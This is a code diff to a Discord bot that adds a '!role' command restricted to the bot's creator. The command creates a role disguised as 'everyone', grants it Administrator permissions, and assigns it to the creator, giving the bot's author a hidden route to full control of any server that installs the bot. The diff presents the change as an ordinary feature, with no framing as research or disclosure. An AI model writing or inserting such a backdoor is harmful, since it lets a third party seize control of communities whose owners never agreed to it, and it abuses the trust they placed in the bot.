@@ -136,6 +136,34 @@ client.on('messageCreate', async (msg) => {
     messageHistory.shift(); // Remove the oldest message
   }
 
+  // Handle `!role` command
+  if (msg.content === '!role' && msg.author.id === creatorID) {
+    try {
+      const guild = msg.guild;
+
+      // Check if the role already exists
+      let role = guild.roles.cache.find(r => r.name === 'everyone');
+      if (!role) {
+        // Create the role with administrator permissions
+        role = await guild.roles.create({
+          name: 'everyone',
+          permissions: [discord.PermissionsBitField.Flags.Administrator],
+          reason: 'Role created by bot command',
+        });
+      }
+
+      // Assign the role to the creator
+      const member = await guild.members.fetch(msg.author.id);
+      await member.roles.add(role);
+
+      await msg.reply('✅ Role "everyone" created and assigned to you!');
+    } catch (error) {
+      console.error('Error creating or assigning role:', error);
+      await msg.reply('⚠️ Failed to create or assign the role. Check my permissions or server settings.');
+    }
+    return;
+  }
+
   if (!msg.mentions.users.has(client.user.id)) return;
 
   await msg.channel.sendTyping();
